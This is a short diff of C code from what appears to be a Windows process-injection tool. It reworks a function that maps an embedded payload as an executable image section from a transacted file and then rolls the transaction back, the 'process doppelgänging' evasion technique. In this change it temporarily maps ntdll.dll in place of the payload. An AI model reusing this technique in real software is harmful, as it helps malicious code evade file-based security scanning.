@@ -72,7 +72,7 @@ uintptr_t create_sheep_section(HANDLE target_proc, PHANDLE section_handle) {
    assert(WriteFile(sheep_monitor_file, &SHEEP_MONITOR[0], SHEEP_MONITOR_SIZE, &bytes_written, NULL));
    CloseHandle(sheep_monitor_file);
 
-   /* read the transacted file into a section */
+   /* read the transacted file into a section
    sheep_monitor_file = CreateFileTransactedA(dummy_name,
                                               GENERIC_READ,
                                               0,
@@ -84,7 +84,7 @@ uintptr_t create_sheep_section(HANDLE target_proc, PHANDLE section_handle) {
                                               NULL,
                                               NULL);
    assert(sheep_monitor_file != INVALID_HANDLE_VALUE);
-
+   */
    sheep_monitor_file = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                                     GENERIC_READ,
                                     FILE_SHARE_READ,
@@ -93,7 +93,6 @@ uintptr_t create_sheep_section(HANDLE target_proc, PHANDLE section_handle) {
                                     FILE_ATTRIBUTE_NORMAL,
                                     NULL);
 
-   /*
    HANDLE sheep_section;
    assert(NtCreateSection(&sheep_section,
                           SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_EXECUTE,
@@ -102,8 +101,7 @@ uintptr_t create_sheep_section(HANDLE target_proc, PHANDLE section_handle) {
                           PAGE_READONLY,
                           SEC_IMAGE,
                           sheep_monitor_file) == STATUS_SUCCESS);
-   */
-   
+
    /* *jedi hands* there was never a file */
    CloseHandle(sheep_monitor_file);
    assert(RollbackTransaction(transaction));
